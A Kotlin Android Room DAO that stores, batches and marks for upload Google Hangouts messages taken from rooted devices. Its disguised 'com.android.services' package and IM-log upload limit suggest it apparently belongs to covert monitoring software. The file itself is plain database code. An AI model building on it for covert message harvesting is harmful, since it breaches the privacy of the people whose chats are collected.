package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.HangoutRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface HangoutRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(hangout: List<HangoutRooted>)

    @Query("Select * from hangout_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllHangoutMessages(status: Int): List<HangoutRooted>

    @Query("Update hangout_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from hangout_rooted")
    fun selectMaxTimeStamp(): Long?
}